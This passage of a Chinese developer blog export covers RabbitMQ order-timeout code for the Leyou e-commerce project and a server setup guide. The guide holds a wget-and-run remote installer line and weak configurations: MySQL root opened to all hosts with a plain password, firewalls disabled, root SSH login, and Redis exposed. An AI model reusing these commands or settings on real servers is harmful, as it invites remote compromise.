TopicExchange <span class="title function_">deadExchange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TopicExchange</span>(DEAD_EXCHANGE_NAME, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">deadOrderQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; args = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// x-message-ttl 声明队列TTL值</span></span><br><span class="line">        args.put(<span class="string">&quot;x-message-ttl&quot;</span>, ORDER_QUEUE_DELAY_TIME);</span><br><span class="line">        <span class="comment">// x-dead-letter-exchange 声明当前队列绑定的死信交换机</span></span><br><span class="line">        args.put(<span class="string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE_NAME);</span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(DEAD_ORDER_QUEUE).withArguments(args).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">evictOrderQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(EVICT_ORDER_QUEUE).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将死信队列与ly.order.exchange交换机绑定</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingDeadQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(deadOrderQueue()).to(orderExchange()).with(EVICT_ORDER_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把死信交换机与ly.evict.order.queue绑定</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingEvictQueue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(evictOrderQueue()).to(deadExchange()).with(EVICT_ORDER_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * JSON的消息转换器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Jackson2JsonMessageConverter <span class="title function_">messageConverter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>监听MQ消息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.mq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.OrderService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.MQConstants.QueueConstants.EVICT_ORDER_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderListener</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderListener</span><span class="params">(OrderService orderService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.orderService = orderService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 监听清理订单的消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderId 订单id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RabbitListener(queues = EVICT_ORDER_QUEUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenOrderMessage</span><span class="params">(Long orderId)</span> <span class="keyword">throws</span> InterruptedException 	 &#123;</span><br><span class="line">        <span class="keyword">if</span>(orderId != <span class="literal">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;接收到订单任务，订单id：&#123;&#125;&quot;</span>, orderId);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                orderService.evictOrderIfNecessary(orderId);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>清理订单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evictOrderIfNecessary</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.查询订单</span></span><br><span class="line">    <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> getById(orderId);</span><br><span class="line">    <span class="keyword">if</span>(order == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">// 订单不存在，无需处理</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.判断订单是否支付</span></span><br><span class="line">    <span class="keyword">if</span>(order.getStatus() != OrderStatus.INIT)&#123;</span><br><span class="line">        <span class="comment">// 订单已处理，无需重复处理</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.如果未支付，需要关闭订单</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">boo</span> <span class="operator">=</span> update().set(<span class="string">&quot;status&quot;</span>, OrderStatus.CLOSED.getValue())</span><br><span class="line">        .set(<span class="string">&quot;close_time&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line">        .eq(<span class="string">&quot;order_id&quot;</span>, orderId)</span><br><span class="line">        <span class="comment">// 通过乐观锁进一步保证幂等效果</span></span><br><span class="line">        .eq(<span class="string">&quot;status&quot;</span>, OrderStatus.INIT.getValue())</span><br><span class="line">        <span class="comment">// 执行update</span></span><br><span class="line">        .update();</span><br><span class="line">    <span class="keyword">if</span>(!boo)&#123;</span><br><span class="line">        <span class="comment">// 更新失败，订单状态已经改变，无需处理</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;已关闭超时未支付订单：&#123;&#125;&quot;</span>, orderId);</span><br><span class="line">    <span class="comment">// 4.查询OrderDetail</span></span><br><span class="line">    List&lt;OrderDetail&gt; details = detailService.query().eq(<span class="string">&quot;order_id&quot;</span>, orderId).list();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.获取商品及商品数量信息</span></span><br><span class="line">    Map&lt;Long, Integer&gt; map = details.stream()</span><br><span class="line">        .collect(Collectors.toMap(OrderDetail::getSkuId, OrderDetail::getNum));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6.恢复库存</span></span><br><span class="line">    itemClient.addStock(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="前台门户主要页面展示"><a href="#前台门户主要页面展示" class="headerlink" title="前台门户主要页面展示"></a>前台门户主要页面展示</h2><p>登陆界面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120509.png" alt="登陆">注册界面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120510.png" alt="注册"></p>
<p>首页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120511.png" alt="首页"></p>
<p>搜索结果页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120512.png" alt="搜索结果页"></p>
<p>商品详情页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120513.png" alt="商品详情页"></p>
<p>购物车页面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120514.png" alt="购物车"></p>
<p>结算页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120515.png" alt="结算页"></p>
<p>微信支付页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120516.png" alt="微信支付页"></p>
<p>支付成功页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120517.png" alt="支付成功页"></p>
<h2 id="管理员主要页面展示"><a href="#管理员主要页面展示" class="headerlink" title="管理员主要页面展示"></a>管理员主要页面展示</h2><p>登陆页：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120518.png" alt="管理员登陆页"></p>
<p>规格参数：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120519.png" alt="规格参数"></p>
<p>品牌管理：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120520.png" alt="品牌管理"></p>
<h2 id="分布式日志服务GrayLog页面展示"><a href="#分布式日志服务GrayLog页面展示" class="headerlink" title="分布式日志服务GrayLog页面展示"></a>分布式日志服务GrayLog页面展示</h2><p>日志统计：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120521.png" alt="截屏2021-07-04 上午3.57.06 (2)"></p>
<p>DashBoard页面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120522.png" alt="截屏2021-07-04 上午4.00.20 (2)"></p>
<p>DashBoard页面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120523.png" alt="image-20210704040232327"></p>
<h2 id="链路追踪SkyWalking"><a href="#链路追踪SkyWalking" class="headerlink" title="链路追踪SkyWalking"></a>链路追踪SkyWalking</h2><p>仪表盘页面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120524.png" alt="截屏2021-07-04 上午3.53.43 (2)"></p>
<p>链路追踪页面：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120525.png" alt="截屏2021-07-04 上午3.55.44 (2)"></p>
<p>微服务拓扑图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120526.png" alt="截屏2021-07-04 上午3.55.16 (2)"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>leyou项目搭建</title>
    <url>/2021/12/21/leyou/Leyou%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="项目搭建手册"><a href="#项目搭建手册" class="headerlink" title="项目搭建手册"></a>项目搭建手册</h1><h1 id="Ubuntu20"><a href="#Ubuntu20" class="headerlink" title="Ubuntu20"></a>Ubuntu20</h1><h2 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>

<h2 id="安装openjdk8"><a href="#安装openjdk8" class="headerlink" title="安装openjdk8"></a>安装openjdk8</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br><span class="line"></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<h2 id="手动下载压缩包安装oracle-jdk8"><a href="#手动下载压缩包安装oracle-jdk8" class="headerlink" title="手动下载压缩包安装oracle jdk8"></a>手动下载压缩包安装oracle jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /usr/lib/jvm</span><br><span class="line">sudo tar -zxvf jdk-8u162-linux-x64.tar.gz -C /usr/lib/jvm</span><br><span class="line">sudo vim ~/.bashrc</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">set</span> oracle jdk environment</span></span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_162  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  </span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH  </span><br><span class="line"></span><br><span class="line">source ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_162/bin/java 300</span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装了多个版本的jdk，你可以通过以下命令在这些版本之间切换</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">前面带星号的是当前正在使用的java版本，键入编号选择使用哪个版本。</span></span><br><span class="line">sudo update-alternatives –config java</span><br></pre></td></tr></table></figure>

<h2 id="安装宝塔面板"><a href="#安装宝塔面板" class="headerlink" title="安装宝塔面板"></a>安装宝塔面板</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh 5d238b</span><br></pre></td></tr></table></figure>

<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://nodejs.org/dist/v12.18.3/node-v14.16.0-linux-x64.tar.xz    <span class="comment"># 下载</span></span><br><span class="line">tar xf node-v14.16.0-linux-x64.tar.xz                                  <span class="comment"># 解压</span></span><br><span class="line"><span class="built_in">cd</span> node-v14.16.0-linux-x64                                              <span class="comment"># 进入解压目录</span></span><br><span class="line"><span class="built_in">cp</span> /etc/profile /etc/profile.bak</span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/root/node-v14.16.0-linux-x64/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">node -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org <span class="comment"># 使用淘宝镜像</span></span><br></pre></td></tr></table></figure>

<h2 id="安装vue-cli"><a href="#安装vue-cli" class="headerlink" title="安装vue-cli"></a>安装vue-cli</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cnpm install -g vue-cli</span><br></pre></td></tr></table></figure>

<h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br><span class="line">nginx -v</span><br><span class="line"><span class="built_in">cd</span> /etc/nginx/conf.d</span><br><span class="line">sudo vi leyou.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.leyou.com;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://manage.leyou.com:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name  www.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /root/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                <span class="comment"># 携带hosts地址，避免因代理导致host丢失</span></span><br><span class="line">            proxy_set_header Host       <span class="variable">$host</span>;</span><br><span class="line">            proxy_pass   http://ly-linux;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br></pre></td></tr></table></figure>

<p>nginx文件安装完成之后的文件位置：</p>
<ul>
<li>&#x2F;usr&#x2F;sbin&#x2F;nginx：主程序</li>
<li>&#x2F;etc&#x2F;nginx：存放配置文件</li>
<li>&#x2F;usr&#x2F;share&#x2F;nginx：存放静态文件</li>
<li>&#x2F;var&#x2F;log&#x2F;nginx：存放日志</li>
</ul>
<h2 id="通过jar包启动服务"><a href="#通过jar包启动服务" class="headerlink" title="通过jar包启动服务"></a>通过jar包启动服务</h2><p>将10个jar包放到&#x2F;root&#x2F;leyou</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo -u springboot <span class="built_in">nohup</span> /usr/bin/java -jar /www/wwwroot/ly-gateway-1.0-SNAPSHOT.jar --server.port=10010  &gt;&gt; /tmp/AA1NI23EAG.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">sudo -u springboot <span class="built_in">nohup</span> /usr/bin/java -jar /www/wwwroot/ly-auth-service-1.0-SNAPSHOT.jar --server.port=8082 &gt;&gt; /tmp/U2XZXIUSO1.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ubuntu-执行-sudo-apt-get-update-要很久-解决方法"><a href="#ubuntu-执行-sudo-apt-get-update-要很久-解决方法" class="headerlink" title="ubuntu 执行 sudo apt-get update 要很久 解决方法"></a>ubuntu 执行 sudo apt-get update 要很久 解决方法</h2><p>打开应用页 软件和更新修改ubuntu软件下载源为ustc</p>
<h2 id="ubuntu20-04安装与卸载mysql5-7"><a href="#ubuntu20-04安装与卸载mysql5-7" class="headerlink" title="ubuntu20.04安装与卸载mysql5.7"></a>ubuntu20.04安装与卸载mysql5.7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">安装</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install libaio1 libtinfo5 libmecab2 libjson-perl python2 python2.7</span><br><span class="line">wget https://cdn.mysql.com//Downloads/MySQL-5.7/mysql-server_5.7.31-1ubuntu18.04_amd64.deb-bundle.tar</span><br><span class="line">tar xvf mysql-server_5.7.31-1ubuntu18.04_amd64.deb-bundle.tar</span><br><span class="line">rm -f mysql-testsuite_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">rm -f mysql-community-test_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-common_5.7.31-1ubuntu18.04_amd64.deb</span><br><span class="line">sudo dpkg -i lib*.deb </span><br><span class="line">sudo dpkg -i mysql-*.deb</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载</span></span><br><span class="line">sudo apt-get autoremove --purge mysql-server </span><br><span class="line">sudo apt-get remove mysql-common</span><br><span class="line">sudo rm -rf /etc/mysql/ /var/lib/mysql</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">清理残留数据</span></span><br><span class="line">dpkg -l | grep ^rc| awk &#x27;&#123;print $2&#125;&#x27; | sudo xargs dpkg -P</span><br><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt autoclean</span><br></pre></td></tr></table></figure>

<h2 id="Mysql-ubuntu-开启3306端口，设置远程访问"><a href="#Mysql-ubuntu-开启3306端口，设置远程访问" class="headerlink" title="Mysql ubuntu 开启3306端口，设置远程访问"></a>Mysql ubuntu 开启3306端口，设置远程访问</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">mysql5</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;asdfghjkl&#x27;</span> WITH GRANT OPTION;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">mysql8</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED WITH mysql_native_password BY<span class="string">&#x27;asdfghjkl&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">grant all privileges on *.* to <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果你想允许用户jack从ip为10.10.50.127的主机连接到mysql服务器，并使用654321作为密码</span></span><br><span class="line"><span class="meta">xinximysql&gt;</span><span class="language-bash">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;jack&#x27;</span>@’10.10.50.127’ IDENTIFIED BY <span class="string">&#x27;654321&#x27;</span> WITH GRANT OPTION;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改mysql数据库中的user表使相应的用户能从某一主机登陆</span></span><br><span class="line">mysql -u root –p</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">use mysql;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">update user <span class="built_in">set</span> host = <span class="string">&#x27;%&#x27;</span> <span class="built_in">where</span> user = <span class="string">&#x27;root&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="language-bash">select host, user from user;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw status</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改MySQL的配置文件</span></span><br><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">bind-address = 127.0.0.1</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">service mysql restart</span><br></pre></td></tr></table></figure>

<h2 id="Ubuntu安装redis"><a href="#Ubuntu安装redis" class="headerlink" title="Ubuntu安装redis"></a>Ubuntu安装redis</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br><span class="line">sudo vi /etc/redis/redis.conf</span><br><span class="line">requirepass hzlarm</span><br><span class="line"></span><br><span class="line">注释掉绑定地址#bind 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Redis以守护进程运行</p>
<ul>
<li>如果以守护进程运行，则不会在命令行阻塞，类似于服务</li>
<li>如果以非守护进程运行，则当前终端被阻塞，无法使用</li>
<li>推荐改为yes，以守护进程运行<br><code>daemonize no|yes</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service redis-server restart</span><br></pre></td></tr></table></figure>

<h2 id="mac通过shell连接ubuntu20-04"><a href="#mac通过shell连接ubuntu20-04" class="headerlink" title="mac通过shell连接ubuntu20.04"></a>mac通过shell连接ubuntu20.04</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">在ubuntu上安装openssh-server</span></span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="language-bash">PermitRootLogin without-password</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="language-bash">进入root文件夹需要输入root密码</span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">sudo ufw disable</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启ssh服务</span></span><br><span class="line">sudo /etc/init.d/ssh restart</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><h2 id="安装jdk8"><a href="#安装jdk8" class="headerlink" title="安装jdk8"></a>安装jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">方法一</span></span><br><span class="line">cd /opt/module</span><br><span class="line">mkdir java</span><br><span class="line">cd java</span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/java</span><br><span class="line"> </span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/java/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">方法二</span></span><br><span class="line">yum install java-1.8.0-openjdk</span><br></pre></td></tr></table></figure>

<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install openssh-server</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="language-bash">PermitRootLogin without-password</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="language-bash">进入root文件夹需要输入root密码</span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>

<h3 id="SSH连接失败，报错Host-key-verification-failed——原理和解决方法"><a href="#SSH连接失败，报错Host-key-verification-failed——原理和解决方法" class="headerlink" title="SSH连接失败，报错Host key verification failed——原理和解决方法"></a>SSH连接失败，报错Host key verification failed——原理和解决方法</h3><ul>
<li><p>直接将&#x2F;root&#x2F;.ssh&#x2F;known_hosts 文件删除即可。或者你将对应的记录删除即可（根据ip查就行）。之后再次ssh连接。</p>
</li>
<li><p>vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config  #修改下方选项，则不再校验服务端主机身份，输入账号密码直接连接。注意这个不建议使用，不安全。StrictHostKeyChecking&#x3D;no</p>
</li>
</ul>
<h2 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a>更新yum源</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">备份原来的yum源</span></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"><span class="meta"># </span><span class="language-bash">下载163yum源配置</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"><span class="meta"># </span><span class="language-bash">清空yum缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta"># </span><span class="language-bash">生成缓存</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h2 id="设置静态ip"><a href="#设置静态ip" class="headerlink" title="设置静态ip"></a>设置静态ip</h2><p>首先进入网络配置的目录：</p>
